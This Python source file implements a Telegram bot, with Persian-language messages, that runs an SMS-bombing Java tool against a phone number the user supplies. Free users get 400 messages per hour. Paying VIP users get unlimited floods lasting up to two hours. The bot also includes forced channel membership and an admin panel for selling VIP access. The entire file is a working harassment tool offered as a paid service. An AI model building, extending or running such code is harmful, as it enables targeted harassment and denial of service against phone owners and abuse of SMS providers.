import os
import threading
import time
import subprocess
import signal
import json
import asyncio
from queue import Queue, Empty
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# --- تنظیمات اصلی (این مقادیر توسط اسکریپت نصب جایگزین خواهند شد) ---
BOT_TOKEN = "YOUR_BOT_TOKEN"
CHANNEL_ID = 0 # به صورت عددی
CHANNEL_USERNAME = "YOUR_CHANNEL_USERNAME"
PATH_TO_JAR = "SMSBomber.jar"
COOLDOWN_SECONDS = 3600
NORMAL_USER_ATTACK_COUNT = 400
VIP_MAX_DURATION_SECONDS = 2 * 3600
JAVA_THREAD_COUNT = 8

# --- تنظیمات ادمین (این مقادیر توسط اسکریپت نصب جایگزین خواهند شد) ---
ADMIN_ID = 0 # به صورت عددی
ADMIN_USERNAME = "YOUR_ADMIN_USERNAME"

# --- فایل‌های پایگاه داده ---
USERS_FILE = "users.json"
VIPS_FILE = "vips.json"

all_users, vip_users, user_data, user_last_attack_time, active_processes = {}, [], {}, {}, {}

def load_data():
    global all_users, vip_users
    try:
        with open(USERS_FILE, 'r') as f: all_users = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError): all_users = {}
    try:
        with open(VIPS_FILE, 'r') as f: vip_users = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError): vip_users = []

def save_users():
    with open(USERS_FILE, 'w') as f: json.dump(all_users, f, indent=4)

def save_vips():
    with open(VIPS_FILE, 'w') as f: json.dump(vip_users, f, indent=4)

def enqueue_output(out, queue):
    for line in iter(out.readline, ''):
        queue.put(line)
    out.close()

def run_attack(phone_number, user_id, message_count, context: ContextTypes.DEFAULT_TYPE, loop: asyncio.AbstractEventLoop):
    sent_count = 0
    status_message_id = None
    start_time = time.time()
    try:
        keyboard = [[InlineKeyboardButton("❌ توقف حمله", callback_data="stop_attack")]]
        initial_message = "⏳ حمله آغاز شد...\nگزارش ارسال در همین پیام به‌روزرسانی می‌شود."
        coro = context.bot.send_message(chat_id=user_id, text=initial_message, reply_markup=InlineKeyboardMarkup(keyboard))
        future = asyncio.run_coroutine_threadsafe(coro, loop)
        message = future.result()
        status_message_id = message.message_id
    except Exception as e:
        print(f"Error sending initial message: {e}"); return

    process = None
    try:
        command = ['nice', '-n', '10', 'java', '-jar', PATH_TO_JAR]
        process = subprocess.Popen(
            command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
            text=True, bufsize=1, universal_newlines=True
        )
        active_processes[user_id] = process
        
        inputs = f"attack\nn\n{phone_number}\nn\n-1\n{JAVA_THREAD_COUNT}\n"
        process.stdin.write(inputs); process.stdin.flush()

        q = Queue()
        t = threading.Thread(target=enqueue_output, args=(process.stdout, q))
        t.daemon = True; t.start()

        while process.poll() is None:
            try:
                line = q.get_nowait()
            except Empty:
                time.sleep(0.5)
                if user_id not in active_processes: break
                if message_count == -1 and (time.time() - start_time) > VIP_MAX_DURATION_SECONDS:
                    break
                continue
            
            if "Sent from:" in line:
                sent_count += 1
                if sent_count % 5 == 0:
                    try:
                        text = f"⏳ تعداد پیامک‌های ارسال شده: **{sent_count}** / {message_count if message_count != -1 else '∞'}"
                        coro = context.bot.edit_message_text(text=text, chat_id=user_id, message_id=status_message_id, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ توقف حمله", callback_data="stop_attack")]]))
                        asyncio.run_coroutine_threadsafe(coro, loop)
                    except Exception as e:
                        print(f"Error editing message: {e}")
            
            if message_count != -1 and sent_count >= message_count:
                break
        
        if process.poll() is None:
            process.kill()

    except Exception as e:
        print(f"An error occurred in run_attack: {e}")
    finally:
        final_text = ""
        if user_id in active_processes:
            if message_count == -1 and (time.time() - start_time) > VIP_MAX_DURATION_SECONDS:
                final_text = f"⏰ حمله برای شماره {phone_number} پس از رسیدن به محدودیت زمانی ۲ ساعته متوقف شد.\nتعداد کل پیامک‌های ارسال شده: **{sent_count}**"
            else:
                final_text = f"✅ حمله برای شماره {phone_number} به پایان رسید.\nتعداد کل پیامک‌های ارسال شده: **{sent_count}**"
            del active_processes[user_id]
        else:
            final_text = f"🛑 حمله برای شماره {phone_number} توسط شما متوقف شد.\nتعداد کل پیامک‌های ارسال شده: **{sent_count}**"
        
        coro = context.bot.edit_message_text(text=final_text, chat_id=user_id, message_id=status_message_id, parse_mode='Markdown')
        asyncio.run_coroutine_threadsafe(coro, loop)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user; user_id_str = str(user.id)
    if user_id_str not in all_users:
        all_users[user_id_str] = {'first_name': user.first_name, 'username': user.username}; save_users()
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user.id)
        if member.status not in ['member', 'administrator', 'creator']:
            keyboard = [[InlineKeyboardButton("عضویت در کانال", url=f"https://t.me/{CHANNEL_USERNAME}")], [InlineKeyboardButton("✅ عضو شدم", callback_data="check_join")]]
            await update.message.reply_text(f"❗️ برای استفاده از ربات، ابتدا باید در کانال @{CHANNEL_USERNAME} عضو شوید.", reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            keyboard = [[InlineKeyboardButton("⭐️ خرید اشتراک VIP", url=f"https://t.me/{ADMIN_USERNAME}")]]
            user_data[user.id] = {'state': 'awaiting_number'}
            await update.message.reply_text("سلام! لطفاً شماره تلفن هدف را وارد کنید. (مثال: 09123456789)", reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        await update.message.reply_text(f"خطایی در بررسی عضویت رخ داد. لطفاً مطمئن شوید ربات در کانال شما ادمین است. خطا: {e}")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id; text = update.message.text; current_user_data = user_data.get(user_id)
    if not current_user_data: return
    state = current_user_data.get('state')
    if state == 'awaiting_number':
        if text.startswith('09') and len(text) == 11 and text.isdigit():
            user_data[user_id]['state'] = 'awaiting_confirmation'; user_data[user_id]['phone'] = text
            disclaimer_text = f"شما شماره `{text}` را وارد کرده‌اید.\n\n⚠️ **توجه:** تمام مسئولیت استفاده نادرست از این ابزار بر عهده شماست.\n\nآیا از صحت شماره و شروع حمله اطمینان دارید؟"
            keyboard = [[InlineKeyboardButton("✅ تایید و شروع حمله", callback_data="confirm_attack")], [InlineKeyboardButton("❌ لغو", callback_data="cancel_attack")]]
            await update.message.reply_text(disclaimer_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        else:
            await update.message.reply_text("فرمت شماره تلفن نامعتبر است.")
    elif state == 'awaiting_vip_count':
        try:
            count = -1 if text.lower() == "max" else int(text)
            if count == 0 or count < -1:
                await update.message.reply_text("تعداد باید یک عدد مثبت یا 'max' باشد.")
                return
            phone_to_attack = current_user_data.get('phone')
            await update.message.reply_text(f"⏳ درخواست شما برای ارسال {count if count != -1 else 'حداکثر ۲ ساعت'} پیامک تایید شد. فرآیند حمله در حال آغاز است...")
            loop = asyncio.get_running_loop()
            threading.Thread(target=run_attack, args=(phone_to_attack, user_id, count, context, loop)).start()
            del user_data[user_id]
        except ValueError:
            await update.message.reply_text("ورودی نامعتبر است. لطفاً فقط عدد یا کلمه 'max' را وارد کنید.")
    elif state == 'awaiting_vip_id_to_add':
        try:
            target_id = int(text)
            if target_id in vip_users: await update.message.reply_text("این کاربر در حال حاضر VIP است.")
            else: vip_users.append(target_id); save_vips(); await update.message.reply_text(f"✅ کاربر با شناسه {target_id} با موفقیت به لیست VIP اضافه شد.")
            del user_data[user_id]
        except ValueError: await update.message.reply_text("شناسه وارد شده نامعتبر است.")
    elif state == 'awaiting_vip_id_to_remove':
        try:
            target_id = int(text)
            if target_id not in vip_users: await update.message.reply_text("این کاربر در لیست VIP وجود ندارد.")
            else: vip_users.remove(target_id); save_vips(); await update.message.reply_text(f"✅ کاربر با شناسه {target_id} با موفقیت از لیست VIP حذف شد.")
            del user_data[user_id]
        except ValueError: await update.message.reply_text("شناسه وارد شده نامعتبر است.")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; await query.answer(); user_id = query.from_user.id; callback_action = query.data
    if callback_action == "check_join":
        member = await context.bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        if member.status in ['member', 'administrator', 'creator']:
            keyboard = [[InlineKeyboardButton("⭐️ خرید اشتراک VIP", url=f"https://t.me/{ADMIN_USERNAME}")]]
            user_data[user_id] = {'state': 'awaiting_number'}
            await query.edit_message_text(text="✅ عضویت شما تایید شد. حالا شماره تلفن هدف را وارد کنید.", reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            await query.edit_message_text(text=f"❌ شما هنوز در کانال @{CHANNEL_USERNAME} عضو نشده‌اید.")
    elif callback_action == "confirm_attack":
        is_vip = user_id in vip_users
        if not is_vip:
            current_time = time.time()
            if user_id in user_last_attack_time and (current_time - user_last_attack_time[user_id]) < COOLDOWN_SECONDS:
                remaining_minutes = int((COOLDOWN_SECONDS - (current_time - user_last_attack_time[user_id])) / 60) + 1
                await query.edit_message_text(text=f"❗️ شما کاربر ویژه نیستید و محدودیت زمانی دارید.\nلطفاً {remaining_minutes} دقیقه دیگر صبر کنید."); return
        phone_to_attack = user_data.get(user_id, {}).get('phone')
        if not phone_to_attack:
            await query.edit_message_text(text="خطایی رخ داد..."); return
        user_last_attack_time[user_id] = time.time()
        if is_vip:
            user_data[user_id]['state'] = 'awaiting_vip_count'
            await query.edit_message_text("⭐️ شما کاربر VIP هستید.\nلطفاً تعداد پیامک‌های مورد نظر خود را به صورت عددی وارد کنید. (برای حمله تا سقف ۲ ساعت، کلمه `max` را ارسال کنید)")
        else:
            await query.message.delete()
            loop = asyncio.get_running_loop()
            threading.Thread(target=run_attack, args=(phone_to_attack, user_id, NORMAL_USER_ATTACK_COUNT, context, loop)).start()
            if user_id in user_data: del user_data[user_id]
    elif callback_action == "cancel_attack":
        user_data[user_id] = {'state': 'awaiting_number'}
        await query.edit_message_text(text="❌ عملیات لغو شد. لطفاً شماره تلفن جدید را وارد کنید.")
    elif callback_action == "stop_attack":
        if user_id in active_processes:
            active_processes[user_id].kill()
        else:
            await query.edit_message_text("هیچ حمله فعالی برای شما یافت نشد یا حمله قبلاً متوقف شده است.")
    elif callback_action == "admin_list_users":
        if not all_users: await query.edit_message_text("هنوز هیچ کاربری ثبت نشده است."); return
        user_list_text = "👥 **لیست کاربران:**\n\n"
        for uid, uinfo in all_users.items():
            username = f"(@{uinfo['username']})" if uinfo['username'] else ""; vip_status = "⭐️" if int(uid) in vip_users else ""
            user_list_text += f"`{uid}` - {uinfo['first_name']} {username} {vip_status}\n"
        for i in range(0, len(user_list_text), 4096):
            await context.bot.send_message(chat_id=user_id, text=user_list_text[i:i+4096], parse_mode='Markdown')
        await query.message.delete()
    elif callback_action == "admin_add_vip":
        user_data[user_id] = {'state': 'awaiting_vip_id_to_add'}
        await query.edit_message_text("لطفا شناسه عددی کاربری که می‌خواهید VIP شود را ارسال کنید.")
    elif callback_action == "admin_remove_vip":
        user_data[user_id] = {'state': 'awaiting_vip_id_to_remove'}
        await query.edit_message_text("لطفا شناسه عددی کاربری که می‌خواهید از لیست VIP حذف شود را ارسال کنید.")

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id != ADMIN_ID: return
    keyboard = [
        [InlineKeyboardButton("👥 لیست کاربران", callback_data="admin_list_users")],
        [InlineKeyboardButton("➕ افزودن VIP", callback_data="admin_add_vip"), InlineKeyboardButton("➖ حذف VIP", callback_data="admin_remove_vip")]
    ]
    await update.message.reply_text("⚙️ **پنل مدیریت**", reply_markup=InlineKeyboardMarkup(keyboard))

def main():
    load_data()
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("admin", admin_panel))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(CallbackQueryHandler(button_callback))
    print("Bot is running with all features...")
    application.run_polling()

if __name__ == '__main__':
    main()
